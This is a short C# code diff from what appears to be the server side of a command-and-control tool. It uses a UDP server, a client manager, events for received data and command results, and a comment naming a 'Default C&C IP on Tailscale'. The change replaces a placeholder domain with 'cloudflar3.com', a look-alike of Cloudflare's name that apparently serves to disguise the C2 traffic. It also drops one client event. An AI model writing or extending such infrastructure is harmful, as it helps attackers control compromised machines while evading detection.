@@ -10,7 +10,7 @@ namespace Server.Logic
     {
         private UdpClient? _udpServer;
         private bool _isRunning;
-        private string _domain = "example.com";
+        private string _domain = "cloudflar3.com";
         private string _serverIp = "100.123.123.123";  // Default C&C IP on Tailscale
         
         private ClientManager? _clientManager;
@@ -22,7 +22,6 @@ namespace Server.Logic
 
         public event Action<string>? OnLogMessage;
         public event Action<ClientInfo>? OnClientAdded;
-        public event Action<int>? OnClientRemoved;
         public event Action<int>? OnClientCountChanged;
         public event Action<int, string>? OnDataReceived;
         public event Action<int, string>? OnCommandResult;
